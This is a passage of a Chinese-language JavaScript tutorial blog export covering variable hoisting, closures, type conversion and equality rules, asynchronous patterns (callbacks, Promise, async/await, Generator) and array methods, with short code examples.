<p>这是因为在JavaScript的函数作用域实现中，所有变量声明（var xxx）都会被提升。 就像在函数体刚进入时声明这些变量一样。上述代码相当于：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = &#123;<span class="attr">name</span>: <span class="string">'harttle'</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> p;</span><br><span class="line">    <span class="built_in">console</span>.log(p.name);</span><br><span class="line">    p = &#123;<span class="attr">name</span>: <span class="string">'alice'</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>Note：变量声明与初始化是两回事，变量提升指的是声明提升，初始化/赋值并不会提升。</p>
</blockquote>
<h3 id="闭包封装"><a href="#闭包封装" class="headerlink" title="闭包封装"></a>闭包封装</h3><p>基于类声明的面向对象语言不通，JavaScript基于原型继承。 JavaScript并未提供<code>public</code>, <code>protected</code>, <code>private</code>等关键字。 而JavaScript的闭包机制则可以完美地提供封装。你只需要：</p>
<ul>
<li>1、将public属性赋值到对象属性。</li>
<li>2、将private属性声明为局部变量或内部函数。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Counter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        count: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;i++;&#125;</span><br><span class="line">        <span class="keyword">get</span>: function () &#123;<span class="keyword">return</span> i;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> counter = Counter();</span><br><span class="line">counter.count();</span><br><span class="line">counter.get();      <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>其中<code>i</code>便是<code>private</code>；<code>count</code>,<code>get</code>便是<code>public</code>。</p>
<h2 id="变量转换"><a href="#变量转换" class="headerlink" title="变量转换"></a>变量转换</h2><h3 id="parseInt-parseFloat"><a href="#parseInt-parseFloat" class="headerlink" title="parseInt parseFloat"></a>parseInt parseFloat</h3><blockquote>
<p>parseInt() 函数可解析一个字符串，并返回一个整数。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(string, radix)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>parseFloat() 函数可解析一个字符串，并返回一个浮点数。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseFloat</span>(string)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>考验你对map的了解，考验你对parseInt方法的了解<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>].map(<span class="built_in">parseInt</span>)   <span class="comment">// [1, NaN, NaN]</span></span><br><span class="line">[<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123; <span class="built_in">console</span>.log(<span class="built_in">arguments</span>) &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ["1", 0, Array[3]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ["2", 1, Array[3]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ["3", 2, Array[3]]</span></span><br></pre></td></tr></table></figure></p>
<h3 id="toString方法"><a href="#toString方法" class="headerlink" title="toString方法"></a><code>toString</code>方法</h3><p>它的作用是返回一个反映这个对象的字符串</p>
<p class="tip">所有对象继承了两个转换方法：<code>toString()</code> and <code>valueOf()</code></p>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回相应的字符串</span></span><br><span class="line"><span class="built_in">console</span>.log(</span><br><span class="line">  (&#123;<span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">    y: <span class="number">1</span></span><br><span class="line">   &#125;).toString()</span><br><span class="line"></span><br><span class="line">  );  <span class="comment">// [object Object]</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].toString()); <span class="comment">// 1,2,3</span></span><br><span class="line"><span class="built_in">console</span>.log((<span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;f(x);&#125;).toString()); <span class="comment">//function (x)&#123;f(x); &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/\d+/g</span>.toString()); <span class="comment">// /\d+/g</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2015</span>,<span class="number">4</span>,<span class="number">4</span>).toString()); <span class="comment">// Mon May 04 2015 00:00:00 GMT+0800</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2015</span>,<span class="number">4</span>,<span class="number">4</span>).valueOf()); <span class="comment">//  1430668800000</span></span><br></pre></td></tr></table></figure>
<h3 id="valueOf方法"><a href="#valueOf方法" class="headerlink" title="valueOf方法"></a><code>valueOf</code>方法</h3><p>它的作用是返回它相应的原始值，一般都是隐式调用它</p>
<p class="tip">每个JavaScript固有对象的 valueOf 方法定义不同</p>

<table>
<thead>
<tr>
<th style="text-align:left">对象</th>
<th style="text-align:left">返回值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Array</td>
<td style="text-align:left">数组的元素被转换为字符串，这些字符串由逗号分隔，连接在一起。其操作与 Array.toString 和 Array.join 方法相同。</td>
</tr>
<tr>
<td style="text-align:left">Boolean</td>
<td style="text-align:left">Boolean 值。</td>
</tr>
<tr>
<td style="text-align:left">Date</td>
<td style="text-align:left">存储的时间是从 1970 年 1 月 1 日午夜开始计的毫秒数 UTC。</td>
</tr>
<tr>
<td style="text-align:left">Function</td>
<td style="text-align:left">函数本身。</td>
</tr>
<tr>
<td style="text-align:left">Number</td>
<td style="text-align:left">数字值。</td>
</tr>
<tr>
<td style="text-align:left">Object</td>
<td style="text-align:left">对象本身。这是默认情况。</td>
</tr>
<tr>
<td style="text-align:left">String</td>
<td style="text-align:left">字符串值。</td>
</tr>
</tbody>
</table>
<p>Math 和 Error 对象没有 valueOf 方法。</p>
<h3 id="运算符判断相等的流程"><a href="#运算符判断相等的流程" class="headerlink" title="===运算符判断相等的流程"></a><code>===</code>运算符判断相等的流程</h3><ol>
<li>如果两个值不是相同类型，它们不相等</li>
<li>如果两个值都是null或者都是undefined，它们相等</li>
<li>如果两个值都是布尔类型true或者都是false，它们相等</li>
<li>如果其中有一个是NaN，它们不相等</li>
<li>如果都是数值型并且数值相等，他们相等， -0等于0</li>
<li>如果他们都是字符串并且在相同位置包含相同的16位值，他它们相等；如果在长度或者内容上不等，它们不相等；两个字符串显示结果相同但是编码不同==和===都认为他们不相等</li>
<li>如果他们指向相同对象、数组、函数，它们相等；如果指向不同对象，他们不相等</li>
</ol>
<h3 id="运算符判断相等的流程-1"><a href="#运算符判断相等的流程-1" class="headerlink" title="==运算符判断相等的流程"></a><code>==</code>运算符判断相等的流程</h3><ol>
<li>如果两个值类型相同，按照===比较方法进行比较</li>
<li>如果类型不同，使用如下规则进行比较</li>
<li>如果其中一个值是null，另一个是undefined，它们相等</li>
<li>如果一个值是数字另一个是字符串，将字符串转换为数字进行比较</li>
<li>如果有布尔类型，将true转换为1，false转换为0，然后用==规则继续比较</li>
<li>如果一个值是对象，另一个是数字或字符串，将对象转换为原始值然后用==规则继续比较<br>其他所有情况都认为不相等</li>
</ol>
<h3 id="对象到字符串的转换步骤"><a href="#对象到字符串的转换步骤" class="headerlink" title="对象到字符串的转换步骤"></a>对象到字符串的转换步骤</h3><ol>
<li>如果对象有valueOf()方法并且返回元素值，javascript将返回值转换为数字作为结果</li>
<li>否则，如果对象有toString()并且返回原始值，javascript将返回结果转换为数字作为结果</li>
<li>否则，throws a TypeError</li>
</ol>
<h3 id="lt-gt-lt-gt-的比较规则"><a href="#lt-gt-lt-gt-的比较规则" class="headerlink" title="&lt;, &gt;, &lt;=, &gt;=的比较规则"></a>&lt;, &gt;, &lt;=, &gt;=的比较规则</h3><p>所有比较运算符都支持任意类型，但是比较只支持数字和字符串，所以需要执行必要的转换然后进行比较，转换规则如下:</p>
<ol>
<li>如果操作数是对象，转换为原始值：如果valueOf方法返回原始值，则使用这个值，否则使用toString方法的结果，如果转换失败则报错</li>
<li>经过必要的对象到原始值的转换后，如果两个操作数都是字符串，按照字母顺序进行比较（他们的16位unicode值的大小）</li>
<li>否则，如果有一个操作数不是字符串，将两个操作数转换为数字进行比较</li>
</ol>
<h3 id="运算符工作流程"><a href="#运算符工作流程" class="headerlink" title="+运算符工作流程"></a>+运算符工作流程</h3><ol>
<li>如果有操作数是对象，转换为原始值</li>
<li>此时如果有一个操作数是字符串，其他的操作数都转换为字符串并执行连接</li>
<li>否则：所有操作数都转换为数字并执行加法</li>
</ol>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>变量</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA-异步处理</title>
    <url>/2018/04/17/ECMA_%E5%BC%82%E6%AD%A5%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h2 id="异步处理"><a href="#异步处理" class="headerlink" title="异步处理"></a>异步处理</h2><h4 id="案例简介"><a href="#案例简介" class="headerlink" title="案例简介"></a>案例简介</h4><p>主流的异步处理方案主要有：回调函数(CallBack)、Promise、Generator函数、async/await。这一小节，我们通过一个小例子，对比这几种异步处理方案的不同。</p>
<h6 id="回调函数-CallBack"><a href="#回调函数-CallBack" class="headerlink" title="回调函数(CallBack)"></a>回调函数(CallBack)</h6><p>假设我们有一个 <code>getData</code> 方法，用于异步获取数据，第一个参数为请求的 <code>url</code> 地址，第二个参数是回调函数，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params">url, callBack</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 模拟发送网络请求</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 假设 res 就是返回的数据</span></span><br><span class="line">        <span class="keyword">let</span> res = &#123;</span><br><span class="line">            url: url,</span><br><span class="line">            data: <span class="built_in">Math</span>.random()</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 执行回调，将数据作为参数传递</span></span><br><span class="line">        callBack(res);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们预先设定一个场景，假设我们要请求三次服务器，每一次的请求依赖上一次请求的结果，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">getData(<span class="string">'/page/1?param=123'</span>, (res1) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res1);</span><br><span class="line">    getData(<span class="string">`/page/2?param=<span class="subst">$&#123;res1.data&#125;</span>`</span>, (res2) =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(res2);</span><br><span class="line">        getData(<span class="string">`/page/3?param=<span class="subst">$&#123;res2.data&#125;</span>`</span>, (res3) =&gt; &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(res3);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>通过上面的代码可以看出，第一次请求的 <code>url</code> 地址为：<code>/page/1?param=123</code>，返回结果为 <code>res1</code>。</p>
<p>第二个请求的 <code>url</code> 地址为：<code>/page/2?param=${res1.data}</code>，依赖第一次请求的 <code>res1.data</code>，返回结果为 <code>res2</code>。</p>
<p>第三次请求的 <code>url</code> 地址为：<code>/page/3?param=${res2.data}</code>，依赖第二次请求的 <code>res2.data</code>，返回结果为 <code>res3</code>。</p>
<p>由于后续请求依赖前一个请求的结果，所以我们只能把下一次请求写到上一次请求的回调函数内部，这样就形成了常说的：回调地狱。</p>
<h6 id="使用-Promise"><a href="#使用-Promise" class="headerlink" title="使用 Promise"></a>使用 Promise</h6><p><code>Promise</code> 就是为了解决回调地狱的问题，为异步编程提供统一接口而提出的，最早有社区实现，由于ES6的原因，现在 <code>Promise</code> 已经是语言基础的一部分了。</p>
<p>现在我们使用 <code>Promise</code> 重新实现上面的案例，首先，我们要把异步请求数据的方法封装成 <code>Promise</code> ：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDataAsync</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> res = &#123;</span><br><span class="line">                url: url,</span><br><span class="line">                data: <span class="built_in">Math</span>.random()</span><br><span class="line">            &#125;;</span><br><span class="line">            resolve(res);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么请求的代码应该这样写：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">getDataAsync(<span class="string">'/page/1?param=123'</span>)</span><br><span class="line">.then(<span class="function"><span class="params">res1</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res1);</span><br><span class="line">    <span class="keyword">return</span> getDataAsync(<span class="string">`/page/2?param=<span class="subst">$&#123;res1.data&#125;</span>`</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">res2</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res2);</span><br><span class="line">    <span class="keyword">return</span> getDataAsync(<span class="string">`/page/3?param=<span class="subst">$&#123;res2.data&#125;</span>`</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">res3</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res3);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><code>then</code> 方法返回一个新的 <code>Promise</code> 对象，<code>then</code> 方法的链式调用避免了 <code>CallBack</code> 回调地狱。但也并不是完美，比如我们要添加很多 <code>then</code> 语句，<br>每一个 <code>then</code> 还是要写一个回调。如果场景再复杂一点，比如后边的每一个请求依赖前面所有请求的结果，而不仅仅依赖上一次请求的结果，那会更复杂。<br>为了做的更好，<code>async/await</code> 就应运而生了，来看看使用 <code>async/await</code> 要如何实现。</p>
<h6 id="async-await"><a href="#async-await" class="headerlink" title="async/await"></a>async/await</h6><p><code>getDataAsync</code> 方法不变，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDataAsync</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> res = &#123;</span><br><span class="line">                url: url,</span><br><span class="line">                data: <span class="built_in">Math</span>.random()</span><br><span class="line">            &#125;;</span><br><span class="line">            resolve(res);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>业务代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res1 = <span class="keyword">await</span> getDataAsync(<span class="string">'/page/1?param=123'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(res1);</span><br><span class="line">    <span class="keyword">let</span> res2 = <span class="keyword">await</span> getDataAsync(<span class="string">`/page/2?param=<span class="subst">$&#123;res1.data&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(res2);</span><br><span class="line">    <span class="keyword">let</span> res3 = <span class="keyword">await</span> getDataAsync(<span class="string">`/page/2?param=<span class="subst">$&#123;res2.data&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(res3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对比 <code>Promise</code> 感觉怎么样？是不是非常清晰，但是 <code>async/await</code> 是基于 <code>Promise</code> 的，因为使用 <code>async</code> 修饰的方法最终返回一个 <code>Promise</code>，<br>实际上，<code>async/await</code> 可以看做是使用 <code>Generator</code> 函数处理异步的语法糖，我们来看看如何使用 <code>Generator</code> 函数处理异步。</p>
<h6 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h6><p>首先异步函数依然是：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDataAsync</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> res = &#123;</span><br><span class="line">                url: url,</span><br><span class="line">                data: <span class="built_in">Math</span>.random()</span><br><span class="line">            &#125;;</span><br><span class="line">            resolve(res);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用 <code>Generator</code> 函数可以这样写：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">getData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res1 = <span class="keyword">yield</span> getDataAsync(<span class="string">'/page/1?param=123'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(res1);</span><br><span class="line">    <span class="keyword">let</span> res2 = <span class="keyword">yield</span> getDataAsync(<span class="string">`/page/2?param=<span class="subst">$&#123;res1.data&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(res2);</span><br><span class="line">    <span class="keyword">let</span> res3 = <span class="keyword">yield</span> getDataAsync(<span class="string">`/page/2?param=<span class="subst">$&#123;res2.data&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(res3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们这样逐步执行：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> g = getData();</span><br><span class="line">g.next().value.then(<span class="function"><span class="params">res1</span> =&gt;</span> &#123;</span><br><span class="line">    g.next(res1).value.then(<span class="function"><span class="params">res2</span> =&gt;</span> &#123;</span><br><span class="line">        g.next(res2).value.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            g.next();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面的代码，我们逐步调用遍历器的 <code>next()</code> 方法，由于每一个 <code>next()</code> 方法返回值的 <code>value</code> 属性为一个 <code>Promise</code> 对象，所以我们为其添加 <code>then</code> 方法，<br>在 <code>then</code> 方法里面接着运行 <code>next</code> 方法挪移遍历器指针，直到 <code>Generator</code> 函数运行完成，实际上，这个过程我们不必手动完成，可以封装成一个简单的执行器：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">gen</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> g = gen();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> res = g.next(data);</span><br><span class="line">        <span class="keyword">if</span> (res.done) <span class="keyword">return</span> res.value;</span><br><span class="line">        res.value.then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">            next(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    next();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>run</code> 方法用来自动运行异步的 <code>Generator</code> 函数，其实就是一个递归的过程调用的过程。这样我们就不必手动执行 <code>Generator</code> 函数了。<br>有了 <code>run</code> 方法，我们只需要这样运行 <code>getData</code> 方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">run(getData)</span><br></pre></td></tr></table></figure>
<p>这样，我们就可以把异步操作封装到 <code>Generator</code> 函数内部，使用 <code>run</code> 方法作为 <code>Generator</code> 函数的自执行器，来处理异步。其实我们不难发现，<br><code>async/await</code> 方法相比于 <code>Generator</code> 处理异步的方式，有很多相似的地方，只不过 <code>async/await</code> 在语义化方面更加明显，同时 <code>async/await</code><br>不需要我们手写执行器，其内部已经帮我们封装好了，这就是为什么说 <code>async/await</code> 是 <code>Generator</code> 函数处理异步的语法糖了。</p>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>异步处理</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA-数组</title>
    <url>/2018/04/17/ECMA_%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="一、创建数组"><a href="#一、创建数组" class="headerlink" title="一、创建数组"></a>一、创建数组</h2><h4 id="使用-new-操作符调用构造函数"><a href="#使用-new-操作符调用构造函数" class="headerlink" title="使用 new 操作符调用构造函数"></a>使用 new 操作符调用构造函数</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">20</span>)				<span class="comment">// 创建了一个包含20项的数组</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)	<span class="comment">// 创建了包含字符串 a b c 的三项数组</span></span><br></pre></td></tr></table></figure>
<h4 id="省略-new-操作符"><a href="#省略-new-操作符" class="headerlink" title="省略 new 操作符"></a>省略 new 操作符</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = <span class="built_in">Array</span>(<span class="number">20</span>)</span><br><span class="line"><span class="keyword">var</span> arr = <span class="built_in">Array</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)</span><br></pre></td></tr></table></figure>
<h4 id="数组字面量"><a href="#数组字面量" class="headerlink" title="数组字面量"></a>数组字面量</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = []</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>]</span><br></pre></td></tr></table></figure>
<h4 id="【ES6】Array-of"><a href="#【ES6】Array-of" class="headerlink" title="【ES6】Array.of()"></a>【ES6】Array.of()</h4><ul>
<li>描述：</li>
</ul>
<p>用于创建数组，用法和 new Array() 一样。弥补 Array() 构造函数的不足（即参数不同，行为不同），Array.of() 的行为始终一致，将传入的值作为数组的项，产生数组</p>
<ul>
<li>参数：任意数量任意值</li>
<li>返回值：创建的数组</li>
</ul>
<h4 id="【ES6】Array-from-obj-func-context"><a href="#【ES6】Array-from-obj-func-context" class="headerlink" title="【ES6】Array.from(obj, func, context)"></a>【ES6】Array.from(obj, func, context)</h4><ul>
<li>描述：用于将 类数组对象(拥有length属性的对象) 和 可遍历对象(部署iterable接口的对象，包括 Set/Map) 转为真正的数组</li>
<li>参数：<ul>
<li><code>{Object} obj</code> 要转为数组的对象</li>
<li><code>{Function} func</code> 一个函数，功能类似于数组的map方法，对每一个对象属性执行该函数，并返回由该函数的返回值组成的数组</li>
<li><code>{Object} context</code> 第二个函数参数的执行环境(this指向)</li>
</ul>
</li>
<li>返回值：生成的数组</li>
</ul>
<h2 id="二、数组检测"><a href="#二、数组检测" class="headerlink" title="二、数组检测"></a>二、数组检测</h2><h4 id="使用-instanceof-操作符"><a href="#使用-instanceof-操作符" class="headerlink" title="使用 instanceof 操作符"></a>使用 instanceof 操作符</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (value <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &#123;</span><br><span class="line">    <span class="comment">// 对数组执行某些操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用-Array-isArray-方法"><a href="#使用-Array-isArray-方法" class="headerlink" title="使用 Array.isArray() 方法"></a>使用 Array.isArray() 方法</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(value)) &#123;</span><br><span class="line">    <span class="comment">// 对数组执行某些操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用-Object-prototype-toString-call"><a href="#使用-Object-prototype-toString-call" class="headerlink" title="使用 Object.prototype.toString.call()"></a>使用 Object.prototype.toString.call()</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">Object</span>.prototype.toString.call(obj) === <span class="string">'[object Array]'</span>)&#123;</span><br><span class="line">    <span class="comment">// 对数组执行某些操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="三、数组方法"><a href="#三、数组方法" class="headerlink" title="三、数组方法"></a>三、数组方法</h2><h4 id="转换方法"><a href="#转换方法" class="headerlink" title="转换方法"></a>转换方法</h4><h6 id="toLocalString"><a href="#toLocalString" class="headerlink" title="toLocalString()"></a>toLocalString()</h6><h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h6><h6 id="valueOf-NaN"><a href="#valueOf-NaN" class="headerlink" title="valueOf()"></a>valueOf()</h6><h6 id="join"><a href="#join" class="headerlink" title="join()"></a>join()</h6><h4 id="栈-队列-方法"><a href="#栈-队列-方法" class="headerlink" title="栈/队列 方法"></a>栈/队列 方法</h4><h6 id="push"><a href="#push" class="headerlink" title="push()"></a>push()</h6><ul>
<li>描述：向数组的尾部追加项，并返回数组长度</li>
<li>参数：n多个值，会依次推入数组尾部</li>
<li>返回值：<ul>
<li><code>{Number}</code> 数组长度</li>
</ul>
</li>
<li>是否改变原数组：是</li>
</ul>
<h6 id="pop"><a href="#pop" class="headerlink" title="pop()"></a>pop()</h6><ul>
<li>描述：移除数组最后一项，并返回该项</li>
<li>参数：无</li>
<li>返回值：返回移除项</li>
<li>是否改变原数组：是</li>
</ul>
<h6 id="shift"><a href="#shift" class="headerlink" title="shift()"></a>shift()</h6><ul>
<li>描述：移除数组第一项，并返回该项</li>
<li>参数：无</li>
<li>返回值：返回移除项</li>
<li>是否改变原数组：是</li>
</ul>
<h6 id="unshift"><a href="#unshift" class="headerlink" title="unshift()"></a>unshift()</h6><ul>
<li>描述：在数组最前端添加项，并返回数组长度</li>
<li>参数：n多个值，会依次添加到数组前端</li>
<li>返回值：<ul>
<li><code>{Number}</code> 数组长度</li>
</ul>
</li>
<li>是否改变原数组：是</li>
</ul>
<h4 id="排序方法"><a href="#排序方法" class="headerlink" title="排序方法"></a>排序方法</h4><h6 id="reverse"><a href="#reverse" class="headerlink" title="reverse()"></a>reverse()</h6><ul>
<li>描述：反转数组项的顺序</li>
<li>参数：无</li>
<li>返回值：修改后的数组</li>
<li>是否改变原数组：是</li>
</ul>
<h6 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h6><ul>
<li>描述：对数组进行排序，默认情况下，按照升序排序，sort方法调用每个数组项的 toString() 方法，进行字符串比较</li>
<li><p>参数：【可选】函数</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、如果第一个参数 应该位于 第二个参数 之前 返回一个负数</span><br><span class="line">2、如果第一个参数 应该位于 第二个参数 之后 返回一个正数</span><br><span class="line">3、并列返回0</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回值：排序后的数组</p>
</li>
<li>是否改变原数组：是</li>
</ul>
<h4 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h4><h6 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h6><ul>
<li>描述：基于当前数组的所有项创建一个新数组</li>
<li>参数：【可选】任意数量的任意值</li>
<li>返回值：返回新数组</li>
<li>是否改变原数组：否</li>
</ul>
<h6 id="slice"><a href="#slice" class="headerlink" title="slice()"></a>slice()</h6><ul>
<li>描述：基于当前数组一或多个项创建新数组（截取数组片段）</li>
<li>参数：接收一或两个参数，分别是返回项的起始和结束位置</li>
<li><p>返回值：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、只传起始位置（即一个参数）</span><br><span class="line">    返回：从起始位置到数组末尾的项组成的数组</span><br><span class="line">2、传递两个参数</span><br><span class="line">    返回：从起始位置到结束位置(不包含结束位置)的项组成的数组</span><br><span class="line">3、传递负数</span><br><span class="line">    返回：会用数组长度加上该负数来确定相应的位置，并按照1、2的规则返回新数组</span><br><span class="line">4、起始位置大于结束位置</span><br><span class="line">    返回：空数组</span><br></pre></td></tr></table></figure>
</li>
<li><p>是否改变原数组：否</p>
</li>
</ul>
